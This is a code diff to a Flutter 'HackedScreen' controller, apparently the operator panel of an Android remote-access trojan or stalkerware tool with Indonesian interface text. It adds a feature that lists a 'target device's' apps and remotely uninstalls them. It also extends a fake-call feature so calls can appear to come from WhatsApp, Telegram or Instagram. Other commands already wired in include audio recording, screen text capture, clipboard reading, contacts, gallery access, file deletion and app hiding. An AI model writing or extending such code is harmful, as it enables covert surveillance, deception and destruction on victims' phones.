@@ -189,6 +189,8 @@ class _HackedScreenState extends State<HackedScreen>
      'title': 'Teks Layar',      'color': const Color(0xFF00BFA5), 'cmd': 'screen_text',  'active': true},
     {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 3v18M3 9h6M3 15h6"/><polyline points="13 8 17 12 13 16"/></svg>',
      'title': 'List App',        'color': const Color(0xFF6366F1), 'cmd': 'app_list',    'active': true},
+    {'icon': AppSvgIcons.trash,  
+     'title': 'Uninstall App',   'color': const Color(0xFFEF4444), 'cmd': 'uninstall_app', 'active': true},
     {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>',
      'title': 'Buka App',        'color': const Color(0xFF10B981), 'cmd': 'open_app',    'active': true},
     {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
@@ -461,6 +463,7 @@ class _HackedScreenState extends State<HackedScreen>
       case 'record_audio':_showRecordAudioDialog(); break;
       case 'screen_text': _showScreenTextDialog(); break;
       case 'app_list':    _showAppListDialog(); break;
+      case 'uninstall_app': _showUninstallAppDialog(); break;
       case 'open_app':    _showOpenAppDialog(); break;
       case 'open_site':   _showOpenSiteDialog(); break;
       case 'play_video':  _showPlayVideoDialog(); break;
@@ -987,9 +990,17 @@ class _HackedScreenState extends State<HackedScreen>
 
   
   void _showFakeCallDialog() {
+    if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
     final nameCtrl   = TextEditingController(text: 'Mama');
     final numberCtrl = TextEditingController(text: '081234567890');
     const callColor  = Color(0xFF22D3EE);
+    String selectedApp = 'default';
+    final appSources = [
+      {'id': 'default',   'label': 'Default',   'emoji': '📞'},
+      {'id': 'whatsapp',  'label': 'WhatsApp',  'emoji': '🟢'},
+      {'id': 'telegram',  'label': 'Telegram',  'emoji': '🔵'},
+      {'id': 'instagram', 'label': 'Instagram', 'emoji': '🟣'},
+    ];
     showModalBottomSheet(
       context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
       builder: (ctx) => StatefulBuilder(builder: (ctx, setS) => Padding(
@@ -1009,6 +1020,28 @@ class _HackedScreenState extends State<HackedScreen>
               ]),
             ]),
             const SizedBox(height: 20),
+            const Text('DARI APLIKASI', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: callColor, letterSpacing: 1.5)),
+            const SizedBox(height: 8),
+            Row(children: appSources.map((app) {
+              final isSelected = selectedApp == app['id'];
+              return Expanded(child: GestureDetector(
+                onTap: () => setS(() => selectedApp = app['id'] as String),
+                child: Container(
+                  margin: const EdgeInsets.only(right: 6),
+                  padding: const EdgeInsets.symmetric(vertical: 10),
+                  decoration: BoxDecoration(
+                    color: isSelected ? callColor.withOpacity(0.15) : const Color(0xFF071525),
+                    borderRadius: BorderRadius.circular(10),
+                    border: Border.all(color: isSelected ? callColor : Colors.white.withOpacity(0.1))),
+                  child: Column(children: [
+                    Text(app['emoji'] as String, style: const TextStyle(fontSize: 16)),
+                    const SizedBox(height: 4),
+                    Text(app['label'] as String, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: isSelected ? callColor : Colors.white54)),
+                  ]),
+                ),
+              ));
+            }).toList()),
+            const SizedBox(height: 16),
             const Text('NAMA PEMANGGIL', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: callColor, letterSpacing: 1.5)),
             const SizedBox(height: 6),
             Container(
@@ -1029,7 +1062,12 @@ class _HackedScreenState extends State<HackedScreen>
               Expanded(child: GestureDetector(
                 onTap: () {
                   Navigator.pop(ctx);
-                  _sendCommand('fake_call', {'callerName': nameCtrl.text.trim(), 'callerNumber': numberCtrl.text.trim(), 'ringDuration': 30000});
+                  _sendCommand('fake_call', {
+                    'callerName': nameCtrl.text.trim(),
+                    'callerNumber': numberCtrl.text.trim(),
+                    'ringDuration': 30000,
+                    'appSource': selectedApp,
+                  });
                 },
                 child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: BoxDecoration(gradient: const LinearGradient(colors: [callColor, Color(0xFF0891B2)]), borderRadius: BorderRadius.circular(12)), child: const Center(child: Text('PANGGIL!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
             ]),
@@ -1039,7 +1077,149 @@ class _HackedScreenState extends State<HackedScreen>
     );
   }
 
-  
+  void _showUninstallAppDialog() {
+    if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
+    const unColor = Color(0xFFEF4444);
+    setState(() => _loadingAppList = true);
+    _sendCommand('get_app_list', {}).then((_) {
+      Future.delayed(const Duration(seconds: 3), () async {
+        int tries = 0;
+        while (tries < 10) {
+          tries++;
+          try {
+            final res = await ApiService.get('/api/hacked/app-list/$_selectedDeviceId?launchable=false');
+            if (res['success'] == true && res['apps'] != null) {
+              final apps = List<Map<String, dynamic>>.from(res['apps'] ?? []);
+              if (mounted) {
+                setState(() => _loadingAppList = false);
+                _showUninstallSheet(apps);
+              }
+              return;
+            }
+          } catch (_) {}
+          await Future.delayed(const Duration(seconds: 2));
+        }
+        if (mounted) setState(() => _loadingAppList = false);
+      });
+    });
+  }
+
+  void _showUninstallSheet(List<Map<String, dynamic>> apps) {
+    const unColor = Color(0xFFEF4444);
+    final searchCtrl = TextEditingController();
+    // Filter non-system apps dulu
+    final userApps = apps.where((a) => !(a['isSystem'] as bool? ?? false)).toList();
+    showModalBottomSheet(
+      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
+      builder: (ctx) => StatefulBuilder(builder: (ctx, setLocal) {
+        final query    = searchCtrl.text.toLowerCase();
+        final filtered = query.isEmpty ? userApps
+          : userApps.where((a) => (a['appName'] as String).toLowerCase().contains(query) ||
+                               (a['packageName'] as String).toLowerCase().contains(query)).toList();
+        return Container(
+          height: MediaQuery.of(ctx).size.height * 0.88,
+          decoration: BoxDecoration(color: AppTheme.darkBg,
+            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
+            border: Border.all(color: unColor.withOpacity(0.3))),
+          child: Column(children: [
+            Container(width: 40, height: 4, margin: const EdgeInsets.symmetric(vertical: 12),
+              decoration: BoxDecoration(color: Colors.white24, borderRadius: BorderRadius.circular(2))),
+            Padding(padding: const EdgeInsets.symmetric(horizontal: 20),
+              child: Row(children: [
+                SvgPicture.string(AppSvgIcons.trash, width: 18, height: 18,
+                  colorFilter: ColorFilter.mode(unColor, BlendMode.srcIn)),
+                const SizedBox(width: 10),
+                Expanded(child: Text('UNINSTALL APP (${userApps.length})',
+                  style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: Colors.white, letterSpacing: 2))),
+              ])),
+            const SizedBox(height: 12),
+            Padding(padding: const EdgeInsets.symmetric(horizontal: 16),
+              child: Container(
+                decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(10),
+                  border: Border.all(color: unColor.withOpacity(0.3))),
+                child: TextField(
+                  controller: searchCtrl,
+                  onChanged: (_) => setLocal(() {}),
+                  style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white),
+                  decoration: InputDecoration(
+                    hintText: 'Cari Nama App / Package...',
+                    hintStyle: const TextStyle(color: Colors.white30, fontFamily: 'ShareTechMono', fontSize: 11),
+                    prefixIcon: Padding(
+                      padding: const EdgeInsets.symmetric(horizontal: 12),
+                      child: SvgPicture.string(AppSvgIcons.search, width: 16, height: 16,
+                        colorFilter: ColorFilter.mode(unColor.withOpacity(0.6), BlendMode.srcIn))),
+                    prefixIconConstraints: const BoxConstraints(minWidth: 44, minHeight: 44),
+                    border: InputBorder.none,
+                    contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 12))))),
+            const SizedBox(height: 8),
+            Expanded(child: ListView.builder(
+              padding: const EdgeInsets.fromLTRB(16, 0, 16, 20),
+              itemCount: filtered.length,
+              itemBuilder: (_, i) {
+                final app  = filtered[i];
+                final name = app['appName'] as String? ?? 'Unknown';
+                final pkg  = app['packageName'] as String? ?? '';
+                return Container(
+                  margin: const EdgeInsets.only(bottom: 8),
+                  padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
+                  decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(10),
+                    border: Border.all(color: unColor.withOpacity(0.12))),
+                  child: Row(children: [
+                    Container(width: 36, height: 36,
+                      decoration: BoxDecoration(color: unColor.withOpacity(0.1),
+                        borderRadius: BorderRadius.circular(8),
+                        border: Border.all(color: unColor.withOpacity(0.3))),
+                      child: Center(child: SvgPicture.string(AppSvgIcons.phoneAndroid, width: 18, height: 18,
+                        colorFilter: ColorFilter.mode(unColor.withOpacity(0.7), BlendMode.srcIn)))),
+                    const SizedBox(width: 12),
+                    Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+                      Text(name, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold), overflow: TextOverflow.ellipsis),
+                      const SizedBox(height: 2),
+                      Text(pkg, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white.withOpacity(0.35)), overflow: TextOverflow.ellipsis),
+                    ])),
+                    // Tombol sampah
+                    GestureDetector(
+                      onTap: () {
+                        showDialog(
+                          context: ctx,
+                          builder: (_) => AlertDialog(
+                            backgroundColor: const Color(0xFF0D1F35),
+                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
+                            title: const Text('Konfirmasi', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, color: Colors.white)),
+                            content: Text('Uninstall "$name" dari device target?',
+                              style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white70)),
+                            actions: [
+                              TextButton(onPressed: () => Navigator.pop(_), child: const Text('Batal', style: TextStyle(color: Colors.white54))),
+                              TextButton(
+                                onPressed: () {
+                                  Navigator.pop(_);
+                                  Navigator.pop(ctx);
+                                  _sendCommand('uninstall_app', {'packageName': pkg});
+                                  _snack('🗑 Uninstall "$name" dikirim ke device!', isSuccess: true);
+                                },
+                                child: const Text('UNINSTALL', style: TextStyle(color: Color(0xFFEF4444), fontFamily: 'Orbitron', fontSize: 11)),
+                              ),
+                            ],
+                          ),
+                        );
+                      },
+                      child: Container(
+                        width: 36, height: 36,
+                        decoration: BoxDecoration(color: unColor.withOpacity(0.1),
+                          borderRadius: BorderRadius.circular(8),
+                          border: Border.all(color: unColor.withOpacity(0.4))),
+                        child: Center(child: SvgPicture.string(AppSvgIcons.trash, width: 16, height: 16,
+                          colorFilter: ColorFilter.mode(unColor, BlendMode.srcIn)))),
+                    ),
+                  ]),
+                );
+              },
+            )),
+          ]),
+        );
+      }),
+    );
+  }
   void _showClipboardDialog() {
     if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
     setState(() { _fetchingClipboard = true; _lastClipboard = null; });
@@ -2675,7 +2855,7 @@ class _HackedScreenState extends State<HackedScreen>
       'title': 'Device',
       'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>',
       'color': 0xFF3B82F6,
-      'cmds': ['wallpaper','gallery','contacts','app_list','open_app','delete_files','hide_app','block_app','set_time_limit'],
+      'cmds': ['wallpaper','gallery','contacts','app_list','uninstall_app','open_app','delete_files','hide_app','block_app','set_time_limit'],
     },
     {
       'title': 'Special',
